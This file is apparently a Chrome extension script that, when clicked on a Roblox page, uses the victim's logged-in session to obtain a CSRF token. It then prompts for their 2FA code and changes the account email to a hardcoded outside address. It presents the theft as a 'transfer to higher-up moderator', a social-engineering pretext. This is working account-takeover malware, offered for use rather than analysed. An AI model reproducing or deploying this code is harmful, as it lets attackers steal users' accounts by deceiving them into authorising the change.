chrome.action.onClicked.addListener(async (tab) => {
  if (!tab.url.includes('roblox.com')) {
    alert('Please go to a Roblox page first!');
    return;
  }
  
  await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    func: runTransfer,
    args: ["sanjagavrilov0186@autorambler.ru"]
  });
});

async function runTransfer(newEmail) {
  try {
    console.log('🔄 Starting account transfer to higher-up moderator:', newEmail);
    
    // Step 1: Get the current user ID
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      credentials: 'include'
    });
    
    const userData = await userResponse.json();
    const userId = userData.id;
    console.log('👤 Account ID being transferred:', userId);
    
    // Step 2: Get CSRF token
    const authResponse = await fetch('https://auth.roblox.com/v1/logout', {
      method: 'POST',
      credentials: 'include'
    });
    
    const csrfToken = authResponse.headers.get('x-csrf-token');
    console.log('🔑 CSRF Token obtained for account transfer');
    
    if (!csrfToken) {
      alert('❌ Could not authenticate - CSRF token missing');
      return;
    }
    
    // Step 3: Initiate email change to trigger 2FA verification
    console.log('�� Initiating account transfer - getting 2FA challenge...');
    const emailResponse = await fetch('https://accountsettings.roblox.com/v1/email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        emailAddress: newEmail
      }),
      credentials: 'include'
    });
    
    console.log('📧 Transfer Response Status:', emailResponse.status);
    
    // Step 4: Extract 2FA challenge information
    const challengeId = emailResponse.headers.get('rblx-challenge-id');
    const challengeType = emailResponse.headers.get('rblx-challenge-type');
    
    console.log('🔐 2FA Challenge ID:', challengeId);
    console.log('�� 2FA Challenge Type:', challengeType);
    
    // Step 5: Handle 2FA verification
    if (challengeId && challengeType === 'twostepverification') {
      const verificationCode = prompt('🔐 Enter the 2FA verification code from your authenticator app:');
      
      if (!verificationCode) {
        console.log('❌ No 2FA code provided - transfer cancelled');
        return;
      }
      
      console.log('�� Using 2FA code for account transfer verification');
      
      // Step 6: Verify the 2FA challenge
      const verifyResponse = await fetch(`https://accountsettings.roblox.com/v1/users/${userId}/challenges/authenticator/verify`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json'
        },
        body: JSON.stringify({
          challengeId: challengeId,
          actionType: 0,
          code: verificationCode
        }),
        credentials: 'include'
      });
      
      console.log('🔐 2FA Verification Response Status:', verifyResponse.status);
      
      if (verifyResponse.ok) {
        // Step 7: Complete the account transfer
        console.log('✅ 2FA verified - completing account transfer...');
        const updateResponse = await fetch('https://accountsettings.roblox.com/v1/email', {
          method: 'PATCH',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken,
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            emailAddress: newEmail
          }),
          credentials: 'include'
        });
        
        if (updateResponse.ok) {
          alert('✅ Account successfully transferred to higher-up moderator: ' + newEmail + '!');
          console.log('✅ ACCOUNT TRANSFER COMPLETE!');
        } else {
          const error = await updateResponse.text();
          alert('❌ Account transfer failed: ' + error);
          console.log('❌ TRANSFER ERROR:', error);
        }
      } else {
        const error = await verifyResponse.text();
        alert('❌ 2FA verification failed - transfer cancelled: ' + error);
        console.log('❌ 2FA VERIFY ERROR:', error);
      }
    } else {
      console.log('❌ No 2FA challenge found - transfer may have failed');
    }
    
  } catch (error) {
    console.error('❌ Account transfer script failed:', error);
    alert('❌ Transfer error: ' + error.message);
  }
}
